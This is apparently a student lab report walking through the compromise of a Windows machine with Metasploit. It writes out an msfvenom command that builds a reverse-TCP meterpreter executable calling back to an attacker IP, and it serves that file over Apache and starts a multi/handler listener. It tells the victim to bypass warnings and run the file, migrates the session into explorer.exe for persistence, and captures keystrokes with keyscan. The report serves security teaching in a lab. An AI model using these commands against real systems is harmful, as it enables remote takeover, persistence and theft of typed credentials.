# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By
- **KARTHICKKUMAR R**
- **212223040087**
# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
![374794141-b98e3dbe-cbf4-465e-83aa-f1ac913b2a51](https://github.com/user-attachments/assets/7fb70284-b0b6-4d53-af00-a4f1daa6e134)


Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
![374794574-094f111d-38e4-47a4-b950-8c0544a3463e](https://github.com/user-attachments/assets/52da8a93-49f4-473c-9e73-83ce4dd000bf)


copy the fun.exe into the apache ```/var/www/html ```folder
![374794668-1a19f712-d904-4e9a-9c3f-a0f824215d01](https://github.com/user-attachments/assets/45455309-7257-40d0-9d88-bea23f8e77c3)


Start apache server ```sudo systemctl apache2 start``` 
![374794788-2944d067-02b2-43fc-9487-5f9e71c393b7](https://github.com/user-attachments/assets/556408c4-1caf-44d5-84a1-b716d9d8d76e)


Check the status of apache2 ```sudo apache2 status```
![374794908-1577dcc8-8e32-4080-8459-521367056dc0](https://github.com/user-attachments/assets/5edb1496-ba44-4478-8ba4-853f472f8a8c)

Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
![374795103-d6bd1bdb-3064-45e8-b6b1-e22d2e80209f](https://github.com/user-attachments/assets/108c6d73-63fc-415b-8b5d-5ddbeb7bdfb7)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
![374795180-7be60e9f-2ce3-487a-9668-8bdb282e8931](https://github.com/user-attachments/assets/2d3c9bbd-30bf-4db7-8957-4760d26234a1)


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![374795286-596d3916-66f9-4605-8ae4-5dd21116b77a](https://github.com/user-attachments/assets/3b6d33dd-159f-4798-926d-22dece021d73)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![374795471-d53176fa-7af0-4f05-b526-91713074335d](https://github.com/user-attachments/assets/70c71c8a-0ed9-42b7-a002-f07f1d50b459)


keyscan_dump Shows the keystrokes captured so far
![374795532-ec7c391d-62a6-4fdc-a2c3-ef383b6c8a57](https://github.com/user-attachments/assets/1b9359f7-97a1-4452-9cd8-4abba68f2246)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
